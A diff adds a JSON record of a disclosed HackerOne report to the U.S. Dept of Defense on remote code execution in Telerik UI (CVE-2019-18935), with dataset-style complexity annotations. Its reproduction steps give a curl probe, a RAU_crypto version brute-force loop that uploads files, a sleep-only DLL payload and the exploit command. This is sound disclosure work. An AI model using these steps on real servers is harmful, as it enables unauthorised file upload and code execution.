@@ -1,0 +1,46 @@
+{
+  "reported_to": "U.S. Dept Of Defense",
+  "reported_by": "un4gi ",
+  "title": "Remote Code Execution via Insecure Deserialization in Telerik UI (CVE-2019-18935)",
+  "content": "\nDescription:\nhttps://\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/Telerik.Web.UI.WebResource.axd?type=rau is vulnerable to CVE-2017-11317 and CVE-2019-18935, allowing an attacker to upload arbitrary files and gain remote code execution on the underlying system.\nReferences\nhttps://labs.bishopfox.com/tech-blog/cve-2019-18935-remote-code-execution-in-telerik-ui\nImpact\nAn attacker can execute code on the vulnerable server, allowing an attacker to gain a foothold and exfiltrate data. Depending on the security posture of the underlying system, an attacker may be able to escalate privileges or laterally move to other systems within the network using this access.\nSystem Host(s)\n\u2588\u2588\u2588\u2588\nAffected Product(s) and Version(s)\nTelerik UI Version \u2588\u2588\u2588\nCVE Numbers\nCVE-2017-11317, CVE-2019-18935\nSteps to Reproduce\nVerify the Upload Handler is Registered\nFirst, confirm the file upload handler is registered by issuing the following request:\nCode 78 Bytes\n1curl -sk https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/Telerik.Web.UI.WebResource.axd?type=rau\nYou should see the following response:\nCode 109 Bytes\n1{ \"message\" : \"RadAsyncUpload handler is registered succesfully, however, it may not be accessed directly.\" }\nVersion Identification\nNext, you will need to install RAU_crypto (https://github.com/bao7uo/RAU_crypto) and use it to submit upload requests with known vulnerable versions until finding the correct version. After RAU_crypto has been installed, you can use the following script (with the attached versions.txt file):\nCode 284 Bytes\n1echo 'test' > testfile.txt\n2for VERSION in $(cat versions.txt); do\n3            echo -n \"$VERSION: \"\n4                python3 RAU_crypto.py -P '\u2588\u2588\u2588\u2588\u2588' \"$VERSION\" testfile.txt https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588/Telerik.Web.UI.WebResource.axd?type=rau 2>/dev/null | grep fileInfo || echo\n5        done\nThis uploads a file (in this case, testfile.txt) to the \u2588\u2588\u2588\u2588\u2588 directory on the target server. The contents of my testfile.txt simply included the word \"test\".\nThe script should eventually identify a vulnerable version (\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588), indicating the file upload succeeded and showing an encrypted blob of data related to the uploaded file:\nCode 117 Bytes\n1\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588: {\"fileInfo\":{\"FileName\":\"RAU_crypto.bypass\",\"ContentType\":\"text/html\",\"ContentLength\":5,\"DateJson\":\u2588\u2588\u2588\u2588\u2588 }\nCompiling a Test Payload\nNow that we know we can upload a file to the target, we can attempt to exploit the deserialization vulnerability. To do this, we can compile and upload a DLL that causes the server to sleep for 10 seconds before responding:\nCode 235 Bytes\n1#include <windows.h>\n2#include <stdio.h>\n3\n4BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)\n5{\n6    if (fdwReason == DLL_PROCESS_ATTACH)\n7        Sleep(10000);  // Time interval in milliseconds.\n8    return TRUE;\n9}\nAs a .NET application will only load an assembly once with a given name, the dll from my test will only successfully sleep the server on the first exploit. I have compiled and attached an unused dll for testing purposes if desired (if not, just follow the steps from the link in the references section).\nExploitation\nNow that we have our test payload ready, we can use the attached CVE-2019-18935.py script to upload and execute the dll.\nCode 147 Bytes\n1python3 CVE-2019-18935.py -u https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588/Telerik.Web.UI.WebResource.axd?type=rau -v \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 -f '\u2588\u2588\u2588' -p sleep_2020070207013954_amd64.dll\nNote: I'm having trouble getting the server to sleep with the crafted .dll. The files are getting uploaded, but do not seem to be causing the server to sleep as expected. It is 02:30 AM here at the moment so I am heading to bed but will update tomorrow with more info in the comments, and will end up self closing if I can't get execution.\nSuggested Mitigation/Remediation Actions\nUpdate TelerikUI to the latest (or a patched) version.\n\n",
+  "severity": [
+    9.0,
+    10.0
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Deserialization of Untrusted Data"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1622752020,
+  "report_url": "https://hackerone.com/reports/1174185",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "MEDIUM",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Verify the Upload Handler is Registered by sending a request to the Telerik.Web.UI.WebResource.axd endpoint"
+    ],
+    [
+      2,
+      "Identify the vulnerable version using RAU_crypto tool and a versions.txt file"
+    ],
+    [
+      3,
+      "Compile a test payload (DLL) to exploit the deserialization vulnerability"
+    ],
+    [
+      4,
+      "Upload and execute the DLL using the CVE-2019-18935.py script"
+    ]
+  ],
+  "vuln_description": "The vulnerability involves insecure deserialization in Telerik UI, allowing an attacker to upload arbitrary files and execute remote code on the server. This is achieved by exploiting CVE-2017-11317 and CVE-2019-18935, which enable file upload and deserialization attacks.",
+  "reason": "The attack involves multiple components including version identification, payload compilation, and exploitation scripts. The interaction between these components is non-obvious, requiring knowledge of the Telerik UI internals and deserialization vulnerabilities. Additionally, the need to manipulate the application state through file uploads and DLL execution adds complexity.",
+  "new_complexity": "HIGH",
+  "requires_code": false,
+  "requires_CVE": true,
+  "is_ctf": false,
+  "other_report": null
+}
